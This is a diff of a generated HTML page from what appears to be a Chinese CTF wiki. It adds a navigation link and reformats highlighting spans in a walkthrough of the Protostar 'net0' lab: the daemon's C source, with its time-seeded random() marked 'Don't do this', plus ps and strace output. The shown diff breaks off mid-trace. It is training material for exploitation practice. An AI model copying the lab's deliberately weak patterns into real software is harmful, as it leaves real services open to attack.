@@ -2179,6 +2179,20 @@
 
             
           
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/tetctftoken/" class="md-nav__link">
+        TetCTFToken
+      </a>
+    </li>
+  
+
+            
+          
         </ul>
       </nav>
     </li>
@@ -2718,59 +2732,59 @@
 <blockquote>
 <p>converting strings to little endian integers</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span>
 
 <span class="cp">#define NAME &quot;net0&quot;</span>
 <span class="cp">#define UID 999</span>
 <span class="cp">#define GID 999</span>
 <span class="cp">#define PORT 2999</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">wanted</span><span class="p">;</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">run</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">wanted</span><span class="p">;</span>
 
-<span class="w">  </span><span class="n">wanted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="n">wanted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random</span><span class="p">();</span>
 
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Please send &#39;%d&#39; as a little endian 32bit int</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">wanted</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Please send &#39;%d&#39; as a little endian 32bit int</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">wanted</span><span class="p">);</span>
 
 <span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">// fread from stdin</span>
-<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">      </span><span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">wanted</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Thank you sir/madam</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;I&#39;m sorry, you sent %d instead</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">wanted</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Thank you sir/madam</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;I&#39;m sorry, you sent %d instead</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">username</span><span class="p">;</span>
 
-<span class="w">  </span><span class="cm">/* Run the process as a daemon */</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Run the process as a daemon */</span>
 <span class="w">  </span><span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="n">UID</span><span class="p">,</span><span class="w"> </span><span class="n">GID</span><span class="p">);</span><span class="w">   </span><span class="c1">// deamonizes by cloning itself and killing the parent</span>
 
-<span class="w">  </span><span class="cm">/* Wait for socket activity and return */</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Wait for socket activity and return */</span>
 <span class="w">  </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="w"> </span><span class="c1">// listen on port 2999 for TCP connections</span>
 
-<span class="w">  </span><span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span><span class="w"></span>
-<span class="w">  </span><span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+<span class="w">  </span><span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
 
-<span class="w">  </span><span class="cm">/* Don&#39;t do this :&gt; */</span><span class="w"></span>
-<span class="w">  </span><span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="cm">/* Don&#39;t do this :&gt; */</span>
+<span class="w">  </span><span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
 
-<span class="w">  </span><span class="n">run</span><span class="p">();</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">run</span><span class="p">();</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
 <p>在开始做之前，注意到 <code>net0</code> 已在运行中</p>
-<div class="highlight"><pre><span></span><code>$ ps aux <span class="p">|</span> grep net0
-<span class="m">999</span>       <span class="m">1503</span>  <span class="m">0</span>.0  <span class="m">0</span>.0   <span class="m">1532</span>   <span class="m">272</span> ?        Ss   Sep02   <span class="m">0</span>:00 /opt/protostar/bin/net0
-user     <span class="m">17387</span>  <span class="m">0</span>.0  <span class="m">0</span>.0   <span class="m">3272</span>   <span class="m">644</span> pts/0    S+   <span class="m">01</span>:16   <span class="m">0</span>:00 grep net0
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>net0
+<span class="m">999</span><span class="w">       </span><span class="m">1503</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">   </span><span class="m">1532</span><span class="w">   </span><span class="m">272</span><span class="w"> </span>?<span class="w">        </span>Ss<span class="w">   </span>Sep02<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>/opt/protostar/bin/net0
+user<span class="w">     </span><span class="m">17387</span><span class="w">  </span><span class="m">0</span>.0<span class="w">  </span><span class="m">0</span>.0<span class="w">   </span><span class="m">3272</span><span class="w">   </span><span class="m">644</span><span class="w"> </span>pts/0<span class="w">    </span>S+<span class="w">   </span><span class="m">01</span>:16<span class="w">   </span><span class="m">0</span>:00<span class="w"> </span>grep<span class="w"> </span>net0
 </code></pre></div>
 </li>
 <li>
@@ -2780,39 +2794,39 @@ user     <span class="m">17387</span>  <span class="m">0</span>.0  <span class="
 <p>杀掉原先的 <code>net0</code> 进程，通过 <code>strace</code> 启动，注意到最后调用了函数 <code>clone()</code></p>
 <div class="highlight"><pre><span></span><code><span class="c1"># kill 1503</span>
 <span class="c1"># strace ./net0</span>
-execve<span class="o">(</span><span class="s2">&quot;./net0&quot;</span>, <span class="o">[</span><span class="s2">&quot;./net0&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">24</span> vars */<span class="o">])</span> <span class="o">=</span> <span class="m">0</span>
-brk<span class="o">(</span><span class="m">0</span><span class="o">)</span>                                  <span class="o">=</span> 0x804b000
-access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
-mmap2<span class="o">(</span>NULL, <span class="m">8192</span>, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7fe0000
-access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.preload&quot;</span>, R_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
-open<span class="o">(</span><span class="s2">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY<span class="o">)</span>      <span class="o">=</span> <span class="m">3</span>
-fstat64<span class="o">(</span><span class="m">3</span>, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span><span class="m">0644</span>, <span class="nv">st_size</span><span class="o">=</span><span class="m">13796</span>, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
-mmap2<span class="o">(</span>NULL, <span class="m">13796</span>, PROT_READ, MAP_PRIVATE, <span class="m">3</span>, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7fdc000
-close<span class="o">(</span><span class="m">3</span><span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
-access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
-open<span class="o">(</span><span class="s2">&quot;/lib/libc.so.6&quot;</span>, O_RDONLY<span class="o">)</span>        <span class="o">=</span> <span class="m">3</span>
-read<span class="o">(</span><span class="m">3</span>, <span class="s2">&quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\320m\1\0004\0\0\0&quot;</span>..., <span class="m">512</span><span class="o">)</span> <span class="o">=</span> <span class="m">512</span>
-fstat64<span class="o">(</span><span class="m">3</span>, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span><span class="m">0755</span>, <span class="nv">st_size</span><span class="o">=</span><span class="m">1319176</span>, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
-mmap2<span class="o">(</span>NULL, <span class="m">1329480</span>, PROT_READ<span class="p">|</span>PROT_EXEC, MAP_PRIVATE<span class="p">|</span>MAP_DENYWRITE, <span class="m">3</span>, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7e97000
-mprotect<span class="o">(</span>0xb7fd5000, <span class="m">4096</span>, PROT_NONE<span class="o">)</span>   <span class="o">=</span> <span class="m">0</span>
-mmap2<span class="o">(</span>0xb7fd6000, <span class="m">12288</span>, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE, <span class="m">3</span>, 0x13e<span class="o">)</span> <span class="o">=</span> 0xb7fd6000
-mmap2<span class="o">(</span>0xb7fd9000, <span class="m">10568</span>, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_ANONYMOUS, -1, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7fd9000
-close<span class="o">(</span><span class="m">3</span><span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
-mmap2<span class="o">(</span>NULL, <span class="m">4096</span>, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7e96000
-set_thread_area<span class="o">({</span>entry_number:-1 -&gt; <span class="m">6</span>, base_addr:0xb7e966c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
-mprotect<span class="o">(</span>0xb7fd6000, <span class="m">8192</span>, PROT_READ<span class="o">)</span>   <span class="o">=</span> <span class="m">0</span>
-mprotect<span class="o">(</span>0xb7ffe000, <span class="m">4096</span>, PROT_READ<span class="o">)</span>   <span class="o">=</span> <span class="m">0</span>
-munmap<span class="o">(</span>0xb7fdc000, <span class="m">13796</span><span class="o">)</span>               <span class="o">=</span> <span class="m">0</span>
-rt_sigaction<span class="o">(</span>SIGCHLD, <span class="o">{</span>0x8048dc4, <span class="o">[</span>CHLD<span class="o">]</span>, SA_RESTART<span class="o">}</span>, <span class="o">{</span>SIG_DFL, <span class="o">[]</span>, <span class="m">0</span><span class="o">}</span>, <span class="m">8</span><span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
-rt_sigaction<span class="o">(</span>SIGPIPE, <span class="o">{</span>SIG_IGN, <span class="o">[</span>PIPE<span class="o">]</span>, SA_RESTART<span class="o">}</span>, <span class="o">{</span>SIG_DFL, <span class="o">[]</span>, <span class="m">0</span><span class="o">}</span>, <span class="m">8</span><span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
-open<span class="o">(</span><span class="s2">&quot;/opt/protostar/run/net0.pid&quot;</span>, O_RDWR<span class="p">|</span>O_CREAT<span class="p">|</span>O_TRUNC, <span class="m">0700</span><span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
-setgroups32<span class="o">(</span><span class="m">1</span>, <span class="o">[</span><span class="m">999</span><span class="o">])</span>                   <span class="o">=</span> <span class="m">0</span>
-setresgid32<span class="o">(</span><span class="m">999</span>, <span class="m">999</span>, <span class="m">999</span><span class="o">)</span>              <span class="o">=</span> <span class="m">0</span>
-setresuid32<span class="o">(</span><span class="m">999</span>, <span class="m">999</span>, <span class="m">999</span><span class="o">)</span>              <span class="o">=</span> <span class="m">0</span>
-clone<span class="o">(</span><span class="nv">child_stack</span><span class="o">=</span><span class="m">0</span>, <span class="nv">flags</span><span class="o">=</span>CLONE_CHILD_CLEARTID<span class="p">|</span>CLONE_CHILD_SETTID<span class="p">|</span>SIGCHLD, <span class="nv">child_tidptr</span><span class="o">=</span>0xb7e96728<span class="o">)</span> <span class="o">=</span> <span class="m">17420</span>
+execve<span class="o">(</span><span class="s2">&quot;./net0&quot;</span>,<span class="w"> </span><span class="o">[</span><span class="s2">&quot;./net0&quot;</span><span class="o">]</span>,<span class="w"> </span><span class="o">[</span>/*<span class="w"> </span><span class="m">24</span><span class="w"> </span>vars<span class="w"> </span>*/<span class="o">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+brk<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="w">                                  </span><span class="o">=</span><span class="w"> </span>0x804b000
+access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.nohwcap&quot;</span>,<span class="w"> </span>F_OK<span class="o">)</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>-1<span class="w"> </span>ENOENT<span class="w"> </span><span class="o">(</span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory<span class="o">)</span>
+mmap2<span class="o">(</span>NULL,<span class="w"> </span><span class="m">8192</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_WRITE,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS,<span class="w"> </span>-1,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7fe0000
+access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.preload&quot;</span>,<span class="w"> </span>R_OK<span class="o">)</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>-1<span class="w"> </span>ENOENT<span class="w"> </span><span class="o">(</span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory<span class="o">)</span>
+open<span class="o">(</span><span class="s2">&quot;/etc/ld.so.cache&quot;</span>,<span class="w"> </span>O_RDONLY<span class="o">)</span><span class="w">      </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
+fstat64<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span><span class="m">0644</span>,<span class="w"> </span><span class="nv">st_size</span><span class="o">=</span><span class="m">13796</span>,<span class="w"> </span>...<span class="o">})</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mmap2<span class="o">(</span>NULL,<span class="w"> </span><span class="m">13796</span>,<span class="w"> </span>PROT_READ,<span class="w"> </span>MAP_PRIVATE,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7fdc000
+close<span class="o">(</span><span class="m">3</span><span class="o">)</span><span class="w">                                </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.nohwcap&quot;</span>,<span class="w"> </span>F_OK<span class="o">)</span><span class="w">      </span><span class="o">=</span><span class="w"> </span>-1<span class="w"> </span>ENOENT<span class="w"> </span><span class="o">(</span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory<span class="o">)</span>
+open<span class="o">(</span><span class="s2">&quot;/lib/libc.so.6&quot;</span>,<span class="w"> </span>O_RDONLY<span class="o">)</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
+read<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="s2">&quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\320m\1\0004\0\0\0&quot;</span>...,<span class="w"> </span><span class="m">512</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">512</span>
+fstat64<span class="o">(</span><span class="m">3</span>,<span class="w"> </span><span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span><span class="m">0755</span>,<span class="w"> </span><span class="nv">st_size</span><span class="o">=</span><span class="m">1319176</span>,<span class="w"> </span>...<span class="o">})</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mmap2<span class="o">(</span>NULL,<span class="w"> </span><span class="m">1329480</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_EXEC,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_DENYWRITE,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7e97000
+mprotect<span class="o">(</span>0xb7fd5000,<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>PROT_NONE<span class="o">)</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mmap2<span class="o">(</span>0xb7fd6000,<span class="w"> </span><span class="m">12288</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_WRITE,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_DENYWRITE,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span>0x13e<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7fd6000
+mmap2<span class="o">(</span>0xb7fd9000,<span class="w"> </span><span class="m">10568</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_WRITE,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_FIXED<span class="p">|</span>MAP_ANONYMOUS,<span class="w"> </span>-1,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7fd9000
+close<span class="o">(</span><span class="m">3</span><span class="o">)</span><span class="w">                                </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mmap2<span class="o">(</span>NULL,<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>PROT_READ<span class="p">|</span>PROT_WRITE,<span class="w"> </span>MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS,<span class="w"> </span>-1,<span class="w"> </span><span class="m">0</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0xb7e96000
+set_thread_area<span class="o">({</span>entry_number:-1<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">6</span>,<span class="w"> </span>base_addr:0xb7e966c0,<span class="w"> </span>limit:1048575,<span class="w"> </span>seg_32bit:1,<span class="w"> </span>contents:0,<span class="w"> </span>read_exec_only:0,<span class="w"> </span>limit_in_pages:1,<span class="w"> </span>seg_not_present:0,<span class="w"> </span>useable:1<span class="o">})</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mprotect<span class="o">(</span>0xb7fd6000,<span class="w"> </span><span class="m">8192</span>,<span class="w"> </span>PROT_READ<span class="o">)</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+mprotect<span class="o">(</span>0xb7ffe000,<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>PROT_READ<span class="o">)</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+munmap<span class="o">(</span>0xb7fdc000,<span class="w"> </span><span class="m">13796</span><span class="o">)</span><span class="w">               </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+rt_sigaction<span class="o">(</span>SIGCHLD,<span class="w"> </span><span class="o">{</span>0x8048dc4,<span class="w"> </span><span class="o">[</span>CHLD<span class="o">]</span>,<span class="w"> </span>SA_RESTART<span class="o">}</span>,<span class="w"> </span><span class="o">{</span>SIG_DFL,<span class="w"> </span><span class="o">[]</span>,<span class="w"> </span><span class="m">0</span><span class="o">}</span>,<span class="w"> </span><span class="m">8</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+rt_sigaction<span class="o">(</span>SIGPIPE,<span class="w"> </span><span class="o">{</span>SIG_IGN,<span class="w"> </span><span class="o">[</span>PIPE<span class="o">]</span>,<span class="w"> </span>SA_RESTART<span class="o">}</span>,<span class="w"> </span><span class="o">{</span>SIG_DFL,<span class="w"> </span><span class="o">[]</span>,<span class="w"> </span><span class="m">0</span><span class="o">}</span>,<span class="w"> </span><span class="m">8</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+open<span class="o">(</span><span class="s2">&quot;/opt/protostar/run/net0.pid&quot;</span>,<span class="w"> </span>O_RDWR<span class="p">|</span>O_CREAT<span class="p">|</span>O_TRUNC,<span class="w"> </span><span class="m">0700</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">3</span>
+setgroups32<span class="o">(</span><span class="m">1</span>,<span class="w"> </span><span class="o">[</span><span class="m">999</span><span class="o">])</span><span class="w">                   </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+setresgid32<span class="o">(</span><span class="m">999</span>,<span class="w"> </span><span class="m">999</span>,<span class="w"> </span><span class="m">999</span><span class="o">)</span><span class="w">              </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+setresuid32<span class="o">(</span><span class="m">999</span>,<span class="w"> </span><span class="m">999</span>,<span class="w"> </span><span class="m">999</span><span class="o">)</span><span class="w">              </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+clone<span class="o">(</span><span class="nv">child_stack</span><span class="o">=</span><span class="m">0</span>,<span class="w"> </span><span class="nv">flags</span><span class="o">=</span>CLONE_CHILD_CLEARTID<span class="p">|</span>CLONE_CHILD_SETTID<span class="p">|</span>SIGCHLD,<span class="w"> </span><span class="nv">child_tidptr</span><span class="o">=</span>0xb7e96728<span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">17420</span>
 <span class="c1"># clone() 将创建一个新的进程，是自身的克隆</span>
 <span class="c1"># 返回值 17420 为新进程的 PID</span>
-exit_group<span class="o">(</span><span class="m">0</span><span class="o">)</span>                           <span class="o">=</span> ?
+exit_group<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="w">                           </span><span class="o">=</span><span class="w"> </span>?
 <span class="c1"># 父进程退出，留下子进程 net0</span>
 </code></pre></div>
 </li>
@@ -2820,69 +2834,69 @@ exit_group<span class="o">(</span><span class="m">0</span><span class="o">)</spa
 <p>通过 <code>-f</code> 来跟踪子进程，因为没有杀掉刚创建的进程，所以提示 <code>Address already in use</code></p>
 <div class="highlight"><pre><span></span><code><span class="c1"># -f -- follow forks</span>
 <span class="c1"># strace -f ./net0</span>
-execve<span class="o">(</span><span class="s2">&quot;./net0&quot;</span>, <span class="o">[</span><span class="s2">&quot;./net0&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">24</span> vars */<span class="o">])</span> <span class="o">=</span> <span class="m">0</span>
-brk<span class="o">(</span><span class="m">0</span><span class="o">)</span>                                  <span class="o">=</span> 0x804b000
-access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
-mmap2<span class="o">(</span>NULL, <span class="m">8192</span>, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7fe0000
-access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.preload&quot;</span>, R_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
-open<span class="o">(</span><span class="s2">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY<span class="o">)</span>      <span class="o">=</span> <span class="m">3</span>
-fstat64<span class="o">(</span><span class="m">3</span>, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span><span class="m">0644</span>, <span class="nv">st_size</span><span class="o">=</span><span class="m">13796</span>, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
-mmap2<span class="o">(</span>NULL, <span class="m">13796</span>, PROT_READ, MAP_PRIVATE, <span class="m">3</span>, <span class="m">0</span><span class="o">)</span> <span class="o">=</span> 0xb7fdc000
-close<span class="o">(</span><span class="m">3</span><span class="o">)</span>                                <span class="o">=</span> <span class="m">0</span>
-access<span class="o">(</span><span class="s2">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
-open<span class="o">(</span><span class="s2">&quot;/lib/libc.so.6&quot;</span>, O_RDONLY<span class="o">)</span>        <span class="o">=</span> <span class="m">3</span>
-read<span class="o">(</span><span class="m">3</span>, <span class="s2">&quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\320m\1\0004\0\0\0&quot;</span>..., <span class="m">512</span><span class="o">)</span> <span class="o">=</span> <span class="m">512</span>
